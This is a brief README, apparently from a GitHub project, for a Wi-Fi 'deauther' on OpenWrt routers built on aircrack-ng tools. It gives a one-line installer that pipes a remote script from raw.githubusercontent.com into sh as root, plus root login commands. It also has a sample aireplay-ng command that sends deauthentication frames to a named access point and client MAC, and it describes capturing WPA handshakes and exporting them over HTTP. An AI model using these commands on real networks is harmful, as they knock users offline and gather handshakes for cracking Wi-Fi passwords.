# openwrt deauther based on airplay-ng
- Functions similar on kali
- Also it can capture WPA Handshakes
- Export handshake or any files from openwrt and download from the browser through
```sh
python -m http.server -b localhost
```
-  👉 [http://localhost:8000](http://localhost:8000)

## Root access 
```sh
ssh root@192.168.1.1
```
```sh
telnet 192.168.1.1
```

## Auto install 
```sh

opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
````
## sample commands
> More info
 - aireplay-ng --help
 - airodump-ng --help
 - aircrack-ng --help

`
aireplay-ng mon0 --deauth 20 -a 32:AA:E4:18:90:45 -c CC:73:14:5D:59:FF --ignore-negative-one
`
